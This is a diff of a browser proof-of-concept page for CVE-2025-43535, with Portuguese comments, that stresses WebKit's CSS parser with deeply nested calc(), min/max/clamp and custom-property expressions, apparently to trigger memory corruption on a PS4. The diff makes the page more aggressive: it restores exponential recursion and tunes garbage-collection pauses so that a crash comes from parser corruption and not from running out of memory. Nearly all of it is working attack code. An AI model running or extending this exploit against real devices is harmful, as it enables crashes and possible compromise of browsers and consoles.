@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — V1 Isolada</title>
+<title>CVE-2025-43535 PoC — V1 Agressiva</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption Parser/Layout (CSS Math)</h3>
+<h3>CVE-2025-43535 — Memory Corruption Parser (V1 Agressiva)</h3>
 <div id="log"></div>
 
 <script>
@@ -22,30 +22,26 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-// Pausa para permitir que o Event Loop e o GC do WebKit respirem, evitando DoS por OOM
-const yieldGC = () => new Promise(r => setTimeout(r, 15));
-
-L("=== CVE-2025-43535 PoC Iniciado (V1 Isolada) ===");
+// Respiro para o GC limpar as alocações da iteração *anterior*
+const yieldGC = () => new Promise(r => setTimeout(r, 60));
 
 async function variant1_css_calc_deep() {
-  L("[V1] CSS calc() deep nesting + complex math (Linear Growth)...");
+  L("[V1] CSS calc() + math (Estrutura Exponencial Original)...");
 
   const el = document.createElement('div');
   el.style.cssText = 'position:absolute;top:-9999px';
   document.body.appendChild(el);
-
   const sheet = document.createElement('style');
   document.head.appendChild(sheet);
 
-  // 1. Teste do calc() aninhado (Recursão Linear)
+  // 1. calc() original
   function makeDeepcalc(depth, unit) {
     if (depth <= 0) return `10${unit}`;
     return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
   }
 
-  // Como o stress no JS foi resolvido, podemos testar profundidades maiores no C++
-  const depths = [10, 50, 100, 200, 500]; 
-  const units = ['px', 'em', '%']; 
+  const depths = [5, 10, 20, 30, 50, 100, 150, 200];
+  const units = ['px', 'em', 'rem', '%', 'vw', 'vh', 'fr'];
 
   for (const depth of depths) {
     for (const unit of units) {
@@ -58,38 +54,39 @@ async function variant1_css_calc_deep() {
         el.style.width = calc;
         el.style.height = calc;
         void el.offsetWidth;
-      } catch(e) { }
+      } catch(e) {}
     }
-    await yieldGC(); // Respiro para o GC limpar as strings e nós de estilo órfãos
+    await yieldGC(); // Limpa as strings geradas pelo calc()
   }
 
-  // 2. Teste das funções matemáticas (Corrigido para evitar explosão de RAM)
+  // 2. math functions originais (Agressividade restaurada)
   function makeMathNested(depth) {
     if (depth <= 0) return '10px';
     const funcs = ['min', 'max', 'clamp'];
     const f = funcs[depth % 3];
-    
-    // Recursão apenas no primeiro argumento para manter crescimento O(n) e focar no parser stack
     if (f === 'clamp') {
-      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, 100px)`;
+      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
     }
-    return `${f}(${makeMathNested(depth-1)}, 15px)`;
+    return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
   }
 
-  // Subindo o limite drasticamente, pois agora a memória aguenta
-  L("[V1] Executando loop de profundidade math até 1000...");
-  for (let d = 1; d <= 1000; d++) {
+  // Limite cauteloso: 25. 
+  L("[V1] Executando loop math agressivo (limite = 25)...");
+  for (let d = 1; d <= 25; d++) {
     try {
       const expr = makeMathNested(d);
       el.style.width = expr;
       el.style.height = expr;
       void el.offsetWidth;
+      L(`[V1] Math depth ${d} processado.`);
     } catch(e) {}
     
-    if (d % 25 === 0) await yieldGC(); 
+    // CRÍTICO: Pausa a partir da iteração 20 para o GC destruir a string gigante anterior
+    // Isso impede que o lixo do d=23 some com o d=24 e cause OOM.
+    if (d >= 20) await yieldGC(); 
   }
 
-  // 3. CSS custom properties (@property)
+  // 3. Custom properties original
   L("[V1] Registrando Custom Properties...");
   for (let i = 0; i < 30; i++) {
     try {
@@ -104,21 +101,19 @@ async function variant1_css_calc_deep() {
       }
       el.style.setProperty(propName, makeDeepcalc(20, 'px'));
     } catch(e) {}
-    if (i % 5 === 0) await yieldGC();
   }
 
-  // Limpeza final
   sheet.textContent = '';
   document.head.removeChild(sheet);
   document.body.removeChild(el);
-  L("[V1] Testes do parser CSS concluídos", "ok");
+  L("[V1] Variante 1 finalizada", "ok");
 }
 
 async function main() {
   try {
     await variant1_css_calc_deep();
-    L("=== EXECUÇÃO FINALIZADA ===", "ok");
-    L("Se o PS4 crashear agora, há grande chance de corrupção real no WebKit (não OOM).", "crash");
+    L("=== COMPLETO ===", "ok");
+    L("Se ocorrer um crash agora, as chances de corrupção real no parser são altíssimas.", "crash");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
   }
